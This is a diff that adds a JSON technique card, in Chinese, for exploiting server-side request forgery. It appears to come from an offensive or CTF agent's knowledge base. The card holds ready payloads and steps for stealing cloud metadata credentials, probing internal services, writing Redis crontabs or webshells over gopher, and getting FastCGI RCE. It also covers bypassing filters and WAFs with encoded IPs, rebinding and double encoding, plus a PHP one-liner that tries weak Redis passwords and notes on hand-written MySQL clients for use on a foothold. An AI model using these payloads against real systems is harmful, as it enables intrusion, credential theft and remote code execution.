@@ -1,0 +1,69 @@
+{
+  "id": "ssrf-to-metadata-and-internal",
+  "title": "SSRF -> 云元数据/内网资产/协议走私",
+  "vuln_pattern": "服务端按用户可控 URL 发起请求，用于打云元数据、内网探测、file/gopher 协议提权",
+  "fingerprint": [
+    "ssrf",
+    "url=",
+    "fetch",
+    "webhook",
+    "内网资产探测",
+    "asset probe",
+    "image proxy",
+    "import from url",
+    "pdf render",
+    "curl",
+    "http client",
+    "redirect",
+    "服务端请求伪造",
+    "内网",
+    "内网探测",
+    "元数据",
+    "云凭据",
+    "接口"
+  ],
+  "exploit_steps": [
+    "用 OOB 回调地址(interactsh/自建监听)确认能出站——收到回调即证明 SSRF",
+    "打云元数据：AWS 169.254.169.254/latest/meta-data/iam/security-credentials/ 取临时凭证；阿里/腾讯/GCP 各自元数据地址",
+    "内网探测：扫 127.0.0.1 与内网段常见端口(6379 redis/8080/2375 docker/9200 es)，按 banner 识别",
+    "协议提级：若客户端支持 gopher://，可写 redis RESP(写 crontab/webshell)、HTTP 内网 GET/POST，以及含 NUL 的二进制协议——libcurl 把 gopher selector 百分号解码后原样送出(含 0x00),FastCGI/php-fpm over gopher 是标准 SSRF->RCE 路径(见 Gopherus,FastCGI 记录头本身满是 0x00 也能传)。若前面有 PHP 等应用层先做一次 urldecode 会把单编码 %00 折叠成字面 NUL、令 libcurl 在 URL 解析阶段截断——对 payload 做双重 URL 编码(%2500)即可绕过。file:// 读本地文件/flag",
+    "据点侧手写协议(通用:任何'能执行代码但缺服务客户端'的场景,不限 SSRF)：内网主机上没有 mysql/redis-cli/nc 时,用现成解释器(PHP fsockopen / python socket)直接对目标服务讲线协议。与 gopher 的【单向盲】信道不同,这里是全双工——能读回服务端握手包/盐值,故需要挑战-响应认证的协议(带口令的 MySQL native-password)在此可完整走握手->认证->查询;gopher 因读不回盐值只能打免密 MySQL。Redis 用文本型 inline/RESP 命令即可",
+    "绕过校验：DNS rebinding、302 重定向到内网、十进制/十六进制 IP、@ 混淆、[::] 变体"
+  ],
+  "key_payloads": [
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://127.0.0.1:6379/  (探活)",
+    "gopher://127.0.0.1:6379/_<URL编码的redis协议>",
+    "file:///home/ctf/flag.txt",
+    "http://2130706433/  (127.0.0.1 十进制)",
+    "# 缺客户端时就地手写 Redis inline 命令(空格+CRLF,Redis 同时接受 inline 与 RESP;弱口令族:纯数字序/默认产品名/空口令逐条试):",
+    "php -r '$f=fsockopen(\"<内网IP>\",6379);fwrite($f,\"AUTH <weakpass>\\r\\nKEYS *\\r\\nGET <key>\\r\\n\");echo fread($f,4096);'",
+    "python3 - <<'PY'  # 原生 MySQL:socket 收握手包->拼 auth(mysql_native_password=SHA1 异或链)->发 COM_QUERY;读结果集务必按长度编码整数解析",
+    "import socket  # 见 pitfalls:结果集里 0xfc/fd/fe 前缀决定后续长度字节数(0xfb=NULL 列),TEXT/BLOB>250 字节时不解析长度前缀会只读出 NULL",
+    "PY"
+  ],
+  "category": "web",
+  "cve": [],
+  "tags": [
+    "web",
+    "ssrf",
+    "cloud",
+    "oob"
+  ],
+  "source": "original: v2 technique card",
+  "created_ts": 0.0,
+  "preconditions": [
+    "某参数被服务端当作 URL 发起出站请求",
+    "出站未严格校验主机/协议/重定向"
+  ],
+  "verify_oracle": "OOB 监听收到目标出站回调；或响应回显元数据凭证/内网 banner/文件内容",
+  "pitfalls": [
+    "盲 SSRF 无回显时必须用 OOB 回调做预言机，别靠猜",
+    "很多 WAF 拦 169.254.169.254，用十进制/rebinding 绕",
+    "重定向跟随开关决定 302 打法是否可行——先测",
+    "gopher 是【单向盲】信道:能写不能读服务端响应。含 NUL 的二进制帧本身能传(FastCGI over gopher 是标准 RCE 路径,必要时对 payload 双重 URL 编码绕过前置 urldecode)——真限制是'读不回',不是'NUL 截断'。故需先读服务端握手/盐值再算认证的协议(MySQL native-password 挑战-响应)打不通,只有免密 MySQL 可写;FastCGI/redis 无需读回即可完整利用。要打带口令 MySQL 就换据点侧全双工手写(见 exploit_steps)或 SQLi/命令注入等应用层入口",
+    "PHP curl 的 gopher 还受 open_basedir/协议白名单影响，先发 gopher://127.0.0.1:6379/_PING 看响应差分确认协议真放行",
+    "手写 MySQL/二进制协议客户端不解析长度编码整数(length-encoded integer: <0xfb 单字节即值;0xfc+2字节;0xfd+3字节;0xfe+8字节)-> 读长字段(TEXT/BLOB)只拿到 NULL 或错位。先按前缀字节判断字段长度再切片",
+    "手写协议前先确认认证方式:MySQL 8 默认 caching_sha2_password 与旧 mysql_native_password 的挑战-响应算法不同,认证包拼错会握手失败——先读服务端握手包里的 auth-plugin-name 再选算法"
+  ]
+}
